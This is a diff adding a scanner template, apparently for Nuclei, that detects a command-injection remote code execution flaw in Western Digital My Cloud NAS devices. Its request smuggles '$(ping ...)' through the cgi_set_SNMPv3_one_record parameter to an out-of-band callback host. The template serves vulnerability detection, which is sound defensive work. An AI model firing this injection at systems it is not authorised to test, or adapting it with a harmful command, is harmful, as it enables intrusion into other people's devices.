@@ -1,0 +1,40 @@
+id: poc-yaml-west-nas-cgi-set-snmpv3-one-record-rce
+info:
+  name: Western Digital NAS cgi_set_SNMPv3_one_record Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, dnslog
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - id: check-wdmycloud
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "WDMyCloud"
+        part: body
+
+  - id: trigger-rce
+    method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/snmp_mgr.cgi?cmd=cgi_set_SNMPv3_one_record&data=%3Ca%20id=0%3E%3Ccell%3E%24(ping%20{{reverse}})%3C/cell%3E%3C/a%3E&data_len=100"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
